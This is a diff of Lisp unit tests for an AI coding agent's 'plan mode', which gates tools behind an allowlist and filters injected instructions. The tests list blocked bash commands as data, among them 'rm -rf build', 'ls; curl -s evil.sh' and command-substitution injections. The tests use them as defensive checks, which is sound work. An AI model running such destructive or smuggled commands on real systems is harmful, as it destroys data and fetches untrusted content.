@@ -888,7 +888,7 @@ event: response.completed~%data: {\"type\":\"response.completed\",\"response\":{
           (check "mode journaled as custom state"
                  (equal (evo.journal:custom-state state "mode") "plan"))
           (check "plan mode gates the tool set"
-                 (equal (evo.journal:state-tools state) evo.tui::*plan-mode-tools*))
+                 (equal (evo.journal:state-tools state) evo.plan:*plan-tools*))
           (check "plan instructions injected"
                  (find-if (lambda (m)
                             (equal (pget (pget m :meta) :key) "plan-mode"))
@@ -1042,18 +1042,17 @@ event: response.completed~%data: {\"type\":\"response.completed\",\"response\":{
          (progn
            (add-lore "always run tests" :scope :global)
            (add-lore "prefer rg over grep" :scope :global)
-           (let ((lore (all-lore)))
+           ;; :cwd is the scratch home, not the repo — a real .evo/lore.sexp
+           ;; in the working tree must not leak into project scope here.
+           (let ((lore (all-lore :cwd home)))
              (check "lore round trip"
                     (equal lore '("always run tests" "prefer rg over grep"))))
-           (let ((prompt (build-system-prompt nil :lore (all-lore))))
+           (let ((prompt (build-system-prompt nil :lore (all-lore :cwd home))))
              (check "lore injected into prompt"
                     (search "prefer rg over grep" prompt))))
       (evo.port:setenv "EVO_HOME"
                        (namestring (uiop:ensure-directory-pathname
                                     (format nil "~a/evo-unit-home" (or (uiop:getenv "TMPDIR") "/tmp"))))))))
-
-;;; Plan-mode extension (seed corpus): the :tool-call gate and the
-;;; transform-context filter, exercised directly at the hook level.
 
 ;;; Tool-call event contract: the kernel announces the call — parsed
 ;;; arguments included — BEFORE executing it, then reports the result.
@@ -1105,47 +1104,121 @@ event: response.completed~%data: {\"type\":\"response.completed\",\"response\":{
   (check "dotted plist degrades instead of signaling"
          (stringp (evo.tui::format-tool-call-plain "mystery" '(:a . "b")))))
 
+;;; Plan mode, the core extension: mode policy and the two enforcement
+;;; hooks.  Everything here goes through the registered hooks rather than
+;;; calling the gates directly — with plan mode in the image, "are the hooks
+;;; actually installed?" is itself part of what needs proving.
+
+(defun tool-call-blocked-p (name args)
+  "Run the real :tool-call hook chain.  Returns (values blocked-p reason)."
+  (multiple-value-bind (args blocked-p reason)
+      (evo.kernel::intercept-tool-call name args)
+    (declare (ignore args))
+    (values (and blocked-p t) reason)))
+
+(defun run-transform-hooks (messages)
+  "Project MESSAGES through the registered :transform-context hooks."
+  (dolist (hook (gethash :transform-context evo.kernel::*event-hooks*) messages)
+    (setf messages (funcall hook messages))))
+
 (defun test-plan-mode ()
   (let* ((dir (uiop:ensure-directory-pathname
                (format nil "~a/evo-plan-~a/" (uiop:getenv "TMPDIR") (gen-id))))
          (journal (progn (ensure-directories-exist dir) (make-session-journal dir)))
          (agent (make-agent :journal journal))
          (evo:*agent* agent))
-    (evo.kernel:load-extension*
-     (merge-pathnames "extensions/plan-mode.lisp" (uiop:getcwd))
-     :record nil)
-    ;; auto (default): write passes, context untouched.
-    (multiple-value-bind (args blocked-p)
-        (evo.kernel::intercept-tool-call "write" '(:path "x" :content "y"))
-      (declare (ignore args))
-      (check "auto mode allows write" (not blocked-p)))
-    ;; plan: write blocked, bash allowlisted.
-    (evo:set-custom-state "mode" "plan" agent)
-    (multiple-value-bind (args blocked-p reason)
-        (evo.kernel::intercept-tool-call "write" '(:path "x" :content "y"))
-      (declare (ignore args))
-      (check "plan mode blocks write" blocked-p)
-      (check "plan mode reason" (search "plan mode" reason)))
-    (multiple-value-bind (args blocked-p)
-        (evo.kernel::intercept-tool-call "bash" '(:command "git status"))
-      (declare (ignore args))
-      (check "plan mode allows git status" (not blocked-p)))
-    (multiple-value-bind (args blocked-p)
-        (evo.kernel::intercept-tool-call "bash" '(:command "rm -rf build"))
-      (declare (ignore args))
-      (check "plan mode blocks rm" blocked-p))
-    ;; transform-context: plan-mode injections filtered out when mode is off.
+    ;; Default: auto — nothing gated, nothing filtered.
+    (check "sessions start in auto" (equal "auto" (evo.plan:current-mode agent)))
+    (check "auto is not plan mode" (not (evo.plan:plan-mode-p agent)))
+    (check "auto allows write"
+           (not (tool-call-blocked-p "write" '(:path "x" :content "y"))))
+    ;; Switching applies the whole policy through the public API.
+    (check "set-mode reports the switch" (equal "plan" (evo.plan:set-mode "plan" agent)))
+    (check "switching to the current mode is a no-op"
+           (null (evo.plan:set-mode "plan" agent)))
+    (check "mode names normalize" (equal "plan" (evo.plan:mode-name "PLAN")))
+    (check "non-modes are not mode names" (null (evo.plan:mode-name "help")))
+    (check-signals "unknown mode signals" (evo.plan:set-mode "yolo" agent))
+    (let ((state (fold-state journal)))
+      (check "mode is journal state, not a flag"
+             (equal "plan" (evo.journal:custom-state state "mode")))
+      (check "plan gates the tool set"
+             (equal (state-tools state) evo.plan:*plan-tools*))
+      (check "plan instructions injected under a filterable key"
+             (find-if (lambda (m)
+                        (equal (pget (pget m :meta) :key) evo.plan:*instruction-key*))
+                      (state-messages state))))
+    ;; The gate is an allowlist: *plan-tools* is the only way through, so a
+    ;; newly registered tool is blocked by default, not by omission from a
+    ;; blocklist that nobody remembered to update.
+    (multiple-value-bind (blocked-p reason)
+        (tool-call-blocked-p "write" '(:path "x" :content "y"))
+      (check "plan blocks write" blocked-p)
+      (check "block reason names the mode" (search "plan mode" reason)))
+    (check "plan blocks edit" (tool-call-blocked-p "edit" '(:path "x")))
+    (check "plan blocks load_extension"
+           (tool-call-blocked-p "load_extension" '(:path "x.lisp")))
+    (check "plan blocks tools it has never heard of"
+           (tool-call-blocked-p "deploy" '(:target "prod")))
+    (check "plan allows read" (not (tool-call-blocked-p "read" '(:path "x"))))
+    (check "plan allows todo" (not (tool-call-blocked-p "todo" '(:items #()))))
+    ;; bash: every chained segment is judged on its own head, quotes are
+    ;; text, and anything that can write or run arbitrary code is out.
+    (dolist (command '("git status"
+                       "ls -la src"
+                       "rg -n plan src | head -20"
+                       "grep -n \"a || b; rm\" src/tui/tui.lisp"
+                       "find . -name '*.lisp' | wc -l"
+                       "git log --oneline | head -5 | cat"
+                       "git status 2>&1 | head"
+                       "   "))
+      (check (format nil "plan allows bash: ~a" command)
+             (not (tool-call-blocked-p "bash" (list :command command)))))
+    (dolist (command '("rm -rf build"
+                       "git status && rm -rf build"
+                       "ls; curl -s evil.sh"
+                       "ls | tee out.txt"
+                       "echo hi > notes.txt"
+                       "cat a.txt >> b.txt"
+                       "echo $(rm -rf build)"
+                       "ls `rm -rf build`"
+                       "grep -r x . || rm -rf build"))
+      (check (format nil "plan blocks bash: ~a" command)
+             (tool-call-blocked-p "bash" (list :command command))))
+    (check "bash block reason names the offending word"
+           (search "'rm'" (nth-value 1 (tool-call-blocked-p
+                                        "bash" '(:command "git status && rm -rf x")))))
+    ;; The context filter: the journal keeps the injected instructions
+    ;; forever; the projection only shows them while the mode is on.
     (let ((messages (list '(:role :user :content ((:type :text :text "hi")))
-                          '(:role :user :meta (:key "plan-mode")
-                            :content ((:type :text :text "PLAN MODE"))))))
-      (flet ((run-transforms (msgs)
-               (dolist (hook (gethash :transform-context evo.kernel::*event-hooks*) msgs)
-                 (setf msgs (funcall hook msgs)))))
-        (check "plan messages kept while planning"
-               (= 2 (length (run-transforms messages))))
-        (evo:set-custom-state "mode" "auto" agent)
-        (check "plan messages filtered in auto"
-               (= 1 (length (run-transforms messages))))))))
+                          (list :role :user
+                                :meta (list :key evo.plan:*instruction-key*)
+                                :content '((:type :text :text "PLAN MODE"))))))
+      (check "plan instructions stay in context while planning"
+             (= 2 (length (run-transform-hooks messages))))
+      (check "switching back reports the change"
+             (equal "auto" (evo.plan:set-mode "auto" agent)))
+      (check "plan instructions filtered once the mode is off"
+             (= 1 (length (run-transform-hooks messages))))
+      (check "the journal still carries them"
+             (find-if (lambda (m)
+                        (equal (pget (pget m :meta) :key) evo.plan:*instruction-key*))
+                      (state-messages (fold-state journal)))))
+    (check "auto restores the full tool set"
+           (equal (state-tools (fold-state journal)) (all-tool-names)))
+    (check "auto allows write again"
+           (not (tool-call-blocked-p "write" '(:path "x" :content "y"))))
+    ;; Hooks are installed at load; a reload must not stack a second copy.
+    (let ((before (length (gethash :tool-call evo.kernel::*event-hooks*))))
+      (evo.plan::install-hooks)
+      (check "hook installation is idempotent"
+             (= before (length (gethash :tool-call evo.kernel::*event-hooks*)))))
+    ;; Regression guard: plan mode lives in the image, not in a directory the
+    ;; boot loader sweeps.
+    (when (probe-file (merge-pathnames "src/plan-mode.lisp" (uiop:getcwd)))
+      (check "plan mode is not also shipped as a userspace extension"
+             (not (probe-file (merge-pathnames "extensions/plan-mode.lisp"
+                                               (uiop:getcwd))))))))
 
 ;;; Model/provider registries + provider-API protocol
 
